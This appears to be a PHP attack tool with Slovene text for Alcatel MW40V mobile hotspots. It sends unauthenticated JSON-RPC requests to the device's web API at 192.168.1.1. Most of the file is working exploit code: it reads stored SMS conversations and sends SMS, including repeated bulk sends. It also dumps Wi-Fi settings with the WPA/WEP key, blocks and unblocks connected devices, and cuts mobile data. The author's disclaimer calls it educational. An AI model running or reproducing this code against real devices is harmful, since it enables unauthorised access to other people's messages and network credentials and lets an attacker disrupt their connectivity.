<?php
header("Content-type: text/plain");
$imedatoteke = $_SERVER['PHP_SELF'];
$ipnaslov = "192.168.1.1";
@$napad = $_REQUEST['napad'];
@$moznost = $_REQUEST['moznost'];
if(empty($napad)) {
	echo "
 Orodje za vdiranje v Alcatel mobilne dostopne točke.
 Sprogramiral Anton Šijanec, 19 decembra 2018.
 Orodje je bilo testirano na modemu ALCATEL MW40V, s serijsko številko 4E93 in
 programsko opremo različice MW40_E4_02.00_06.
 Vulnerabilityji in exploiti (šibke točke) teh modemov, ki so napisane v tem
 programu sem odkril Anton Šijanec, vendar nisem v nobenem primeru odgovoren
 za posledice uporabe tega programa. Program je namenjen učenju in
 pridobivanju izkušen, da ne boste ponavljali Alcatelovih napak, nikakor pa
 se ga ne sme uporabljati za zlonamerne oziroma škodovalne namene!
 
 Opcije programa: [1] pomeni narejeno, - pomeni še ni narejeno
  2 Vklop in izklop prenosa podatkov
  3 Ogled povezanih naprav, blokiranje naprav, odblokiranje naprav
  - Nastavitev in ogled stanja omejitve podatkovne porabe
  1 Pošiljanje in ogled ter brisanje SMS sporočil
  4 Vklop in izklop Wi-Fi sevalnika (ob izklopu bo ponovni vklop mogoč le prek
    virtualnega Ethernet modema preko USB povezave v računalnik.)
  4 Spreminjanje SSID-ja in nastavitve oglaševanja SSID-ja (oglašuj ali pa ne)
  4 Spreminjanje varnostnega standarda in šifrirnega protokola in spreminjanje
    ter ogled trenutnega varnostnega ključa
  4 Spreminjanje Wi-Fi načina (802.11b/g/n) in legalnih kanalov (FR/AU/US...)
  4 Spreminjanje Wi-Fi kanala in maksimalnega števila vzporednih uporabnikov
  - Spreminjanje in ogled APN profilov (mogoče vsebujejo APN gesla)
  - Aktivacija PIN in PUK blokade in s tem uničenje SIM kartice
  - Spreminjanje povezanega mobilnega omrežja in tehnologije 2G/E/H/H+/3G/4G
  - Spreminjanje DHCP in lokalno omrežnih nastavitev ter MAC black/white lista
  - Ogled IMEIja, ponovni zagon naprave in kopija/obnovitev nastavitev
  - Sprememba administratorskega gesla za dostop do nadzorne plošče
  
 Za zagon modula za napad in za njegove informacije pošljite spremenljivko
 napad z vrednostjo številke, ki je navedena pred modulom
 
 Velika večina odgovorov je v JSON obliki, zato, da jo lahko lažje preberejo
 drugi programi.
";
	exit(" Program $imedatoteke je mrtev.");
}
  
  
  
  
  if($napad == 4) {
	  if($moznost == 1) {
		  			$smsura = date("Y-m-d H:i:s");
$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"GetWlanSettings","params":null,"id":"5.4"}'
    )
);

$context  = stream_context_create($opts);
$i = 0;
$result = "";
$result = file_get_contents('http://'.$ipnaslov.'/jrd/webapi?api=GetWlanSettings', false, $context);
echo "
 Podatki uspešno poslani na modem. Zahtevali ste seznam Wi-Fi nastavitev.
 Legenda:
 - WlanAPID: Vedno 0 (interface)
 - ApStatus: 1-Wi-Fi prižgan, 2-Wi-Fi ugasnjen
 - WMode: 802.11 1-b, 2-b/g, 3-b/g/n
 - Ssid: SSID
 - SsidHidden: 0-Ssid oglaševan, 1-skrito omrežje
 - Channel: 0-Avtomatska izbira kanala, 1-13-Številka kanala
 - SecurityMode: 0-Odprto mrežje, 1-WEP, 2-WPA PSK, 3-WPA2 PSK, 4-WPA/WPA2 PSK
 - WepType: Če je WEP izbran: šifriranje: 0-odprto, 1-share
 - WepKey: Če je WEP izbran: WEP geslo
 - WpaType: Če je WPA izbran: šifriranje: 0-TKIP, 1-AES, 2-avtomatska izbira
 - WpaKey: Če je WPA izbran: WPA geslo
 - CountryCode: Država za WiFi (nekatere imajo omejitve kanalov): AT/US/FR ...
 - ApIsolation: IDKKKKKKKK...
 - max_numsta: Največ vzporednih povezanih naprav: 1-15
 - curr_num: IDKKKKKKKK...
 - CurChannel: IDKKKKKKKK...
 - Bandwidth: IDKKKKKKKK...
 Nastavitve:
 
 $result
 
";
		  exit(" Program $imedatoteke napad $napad moznost $moznost je umrl.");	
	  }
	  
	  echo "
 1. Ogled Wi-Fi nastavitev:
 - Pustite nastavljeno spremenljivko napad na 4, da pustite izbrano TO orodje
 - Nastavite numerično spremenljivko moznost na 1, da izberete način seznama
 - Pošljite zahtevo

 ****** VEČ PRIHAJA KMALU, VERJETNO JU3, ZDAJ SE GREM UČIT NEMŠČINO!!! ******
";
	  
	  
	  	exit(" Program $imedatoteke napad $napad je umrl.");
  }
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
if($napad == 3) {
@$ime = $_REQUEST['ime'];
@$mac = $_REQUEST['mac'];

if($moznost == 1) {
			$smsura = date("Y-m-d H:i:s");
$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"GetConnectedDeviceList","params":null,"id":"12.1"}'
    )
);

$context  = stream_context_create($opts);
$i = 0;
$result = "";
$result = file_get_contents('http://'.$ipnaslov.'/jrd/webapi?api=GetConnectedDeviceList', false, $context);
echo "
 Podatki uspešno poslani na modem. Zahtevali ste seznam povezanih in
 blokiranih naprav.
 
 Povezane naprave:
 
 $result
 
";

$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"GetBlockDeviceList","params":null,"id":"12.2"}'
    )
);

$context  = stream_context_create($opts);
$i = 0;
$result = "";
$result = file_get_contents('http://'.$ipnaslov.'/jrd/webapi?api=GetBlockDeviceList', false, $context);
echo "
 Blokirane naprave:
 
 " . $result . "
"; 
exit(" Program $imedatoteke napad $napad moznost $moznost je umrl.");	
}

if($moznost == 2 && is_numeric($moznost) && !empty($ime) && !empty($mac)) {
		$smsura = date("Y-m-d H:i:s");
$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"SetConnectedDeviceBlock","params":{"DeviceName":"'.$ime.'","MacAddress":"'.$mac.'"},"id":"12.3"}'
    )
);

$context  = stream_context_create($opts);
$i = 0;
$result = "";
$result = file_get_contents('http://'.$ipnaslov.'/jrd/webapi?api=SetConnectedDeviceBlock', false, $context);
echo "
 Podatki uspešno poslani na modem. Zahtevali ste blokacijo naprave
 $ime z MAC naslovom $mac
 Preverite, kaj je modem odgovoril:
 
";
echo "" . $result . "
"; 
exit(" Program $imedatoteke napad $napad moznost $moznost je umrl.");	
	
}
if($moznost == 3 && is_numeric($moznost) && !empty($ime) && !empty($mac)) {
		$smsura = date("Y-m-d H:i:s");
$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"SetDeviceUnlock","params":{"DeviceName":"'.$ime.'","MacAddress":"'.$mac.'"},"id":"12.4"}'
    )
);

$context  = stream_context_create($opts);
$i = 0;
$result = "";
$result = file_get_contents('http://'.$ipnaslov.'/jrd/webapi?api=SetDeviceUnlock', false, $context);
echo "
 Podatki uspešno poslani na modem. Zahtevali ste odblokacijo naprave
 $ime z MAC naslovom $mac
 Preverite, kaj je modem odgovoril:
 
";
echo "" . $result . "
"; 
exit(" Program $imedatoteke napad $napad moznost $moznost je umrl.");	
	
}

	echo "
 Ogled povezanih in blokiranih naprav:
 - Pustite nastavljeno spremenljivko napad na 3, da pustite izbrano TO orodje
 - Nastavite numerično spremenljivko moznost na 1, da izberete način seznama
 - Pošljite zahtevo
 
 Blokiraj / odblokiraj napravo:
 - Pustite nastavljeno spremenljivko napad na 3, da pustite izbrano TO orodje
 - Nastavite spremenljivko ime na DeviceName iz seznama naprav
 - Nastavite spremenljivko mac na MacAddress iz seznama naprav
 - Nastavite numerično spremenljivko moznost na 2, da blokirate napravo
   *** ali pa ***
 - Nastavite numerično spremenljivko moznost na 3, da odblokirate napravo
 - Pošljite zahtevo
";
	exit(" Program $imedatoteke napad $napad je umrl.");
}
  
  
if($napad == 2) {
	
		if($moznost == 1) {
		$smsura = date("Y-m-d H:i:s");
$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"DisConnect","params":null,"id":"3.3"}'
    )
);

$context  = stream_context_create($opts);
$i = 0;
$result = "";
$result = file_get_contents('http://'.$ipnaslov.'/jrd/webapi?api=DisConnect', false, $context);
echo "
 Podatki uspešno poslani na modem. Zahtevali ste izklop prenosa podatkov.
 Preverite, kaj je modem odgovoril:
 
";
echo "" . $result . "
"; 
exit(" Program $imedatoteke napad $napad moznost $moznost je umrl.");	
	}
	
	if($moznost == 2) {
		$smsura = date("Y-m-d H:i:s");
$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"Connect","params":null,"id":"3.2"}'
    )
);

$context  = stream_context_create($opts);
$i = 0;
$result = "";
$result = file_get_contents('http://'.$ipnaslov.'/jrd/webapi?api=Connect', false, $context);
echo "
 Podatki uspešno poslani na modem. Zahtevali ste vklop prenosa podatkov.
 Preverite, kaj je modem odgovoril:
 
";
echo "" . $result . "
"; 
exit(" Program $imedatoteke napad $napad moznost $moznost je umrl.");	
	}
	
	echo "
 Vklop in izklop prenosa podatkov:
 - Pustite nastavljeno spremenljivko napad na 1, da pustite izbrano PPU orodje
 - Nastavite numerično spremenljivko moznost na 1, da izklopite podatke
   *** ali pa ***
 - Nastavite numerično spremenljivko moznost na 2, da vklopite prenos podatkov
 - Pošljite zahtevo
";

	exit(" Program $imedatoteke napad $napad je umrl.");
	
}
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
if($napad == 1) {
@$stevilka = $_REQUEST['stevilka'];
@$tekst = $_REQUEST['tekst'];
@$kolikokrat = $_REQUEST['kolikokrat'];	
@$tekst = $_REQUEST['tekst'];	
	
	
	
	
	
	
if($moznost == 1 && is_numeric($stevilka) && !empty($tekst) && is_numeric($kolikokrat)) {
//pošlji SMS
@$stevilka = $stevilka;
@$tekst = $tekst;
@$koliko = $kolikokrat;
$smsura = date("Y-m-d H:i:s");
$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"SendSMS","params":{"SMSId":-1,"SMSContent":"'.$tekst.'","PhoneNumber":["'.$stevilka.'"],"SMSTime":"'.$smsura.'"},"id":"6.6"}'
    )
);

$context  = stream_context_create($opts);
$i = 0;
$result = "";
while($i < $koliko) {
	$i = $i + 1;
	$lastresult = file_get_contents('http://'.$ipnaslov.'/jrd/webapi?api=SendSMS', false, $context);
$result = $result . "
" . $lastresult;

}
echo "
 Podatki uspešno poslani na SMS strežnik! Odgovor SMS strežnika je zapisan
 spodaj. Preverite podatke, če se zdijo pravilni. Podatki niso omejeni na
 standardnih 80 znakov na vrstico, tako da se lahko narišejo izven vašega
 terminala/ekrana. Pazite tudi na začetni overscan (presledek NI PRISOTEN).
 
";
echo "" . $result . "
"; 
if($lastresult == '{ "jsonrpc": "2.0", "result": { }, "id": "6.6" }') {
	echo"
 SMS strežnik je zagotovo uspešno prejel SMS in ga pošilja v SMS omrežje.

";
}
	
exit(" Program $imedatoteke napad $napad moznost $moznost je umrl.");
	
}
	
	
	
if($moznost == 2) {
	$smsura = date("Y-m-d H:i:s");
$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"GetSMSContactList","params":{"Page":0},"id":"6.2"}'
    )
);

$context  = stream_context_create($opts);
$i = 0;
$result = "";
$result = file_get_contents('http://'.$ipnaslov.'/jrd/webapi?api=GetSMSContactList', false, $context);
echo "
 Podatki uspešno poslani na SMS strežnik! Odgovor SMS strežnika je zapisan
 spodaj. Preverite podatke, če se zdijo pravilni. Podatki niso omejeni na
 standardnih 80 znakov na vrstico, tako da se lahko narišejo izven vašega
 terminala/ekrana. Pazite tudi na začetni overscan (presledek NI PRISOTEN).
 Tokrat je bil zahtevan seznam pogovorov.
 Bodite pozornui na contactId, tega morate uporabiti za ogled sporočil.
 
";
echo "" . $result . "
"; 
exit(" Program $imedatoteke napad $napad moznost $moznost je umrl.");
}
	
	
if($moznost == 3 && is_numeric($stevilka)) {
	$smsura = date("Y-m-d H:i:s");
$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"GetSMSContentList","params":{"Page":0,"ContactId":'.$stevilka.'},"id":"6.3"}'
    )
);

$context  = stream_context_create($opts);
$i = 0;
$result = "";
$result = file_get_contents('http://'.$ipnaslov.'/jrd/webapi?api=GetSMSContentList', false, $context);
echo "
 Podatki uspešno poslani na SMS strežnik! Odgovor SMS strežnika je zapisan
 spodaj. Preverite podatke, če se zdijo pravilni. Podatki niso omejeni na
 standardnih 80 znakov na vrstico, tako da se lahko narišejo izven vašega
 terminala/ekrana. Pazite tudi na začetni overscan (presledek NI PRISOTEN).
 Tokrat je bil zahtevan seznam sporočil v pogovoru.
 
";
echo "" . $result . "
"; 
exit(" Program $imedatoteke napad $napad moznost $moznost je umrl.");
}
	
	
	
// !is_numeric($stevilka) || !is_numeric($kolikokrat) || empty($tekst) || !is_numeric($moznost)
		echo "
 1. Pošiljanje SMS sporočil:
 - Pustite nastavljeno spremenljivko napad na 1, da pustite izbrano SMS orodje
 - Nastavite numerično spremenljivko stevilka z telefonsko številko prejemnika
 - Nastavite numerično spremenljivko kolikokrat, kolikokrat naj pošljem ta SMS
 - Nastavite spremenljivko tekst, kaj naj pošljem v telesu SMS sporocila
 - Nastavite numerično spremenljivko moznost na 1, da izberete pošiljanje SMSa
 - Pošljite zahtevo
 
 2. Pregled, kateri pogovori so shranjeni:
 - Pustite nastavljeno spremenljivko napad na 1, da pustite izbrano SMS orodje
 - Nastavite numerično spremenljivko moznost na 2, da izberete seznam pogovor.
 - Pošljite zahtevo

 3. Ogled SMS pogovora:
 - Pustite nastavljeno spremenljivko napad na 1, da pustite izbrano SMS orodje
 - Nastavite numerično spremenljivko moznost na 3, da izberete ogled pogovora
 - Nastavite numerično spremenljivko stevilka na contactId željenega pogovora
 - Pošljite zahtevo
";


exit(" Program $imedatoteke napad $napad je umrl.");

}

?>
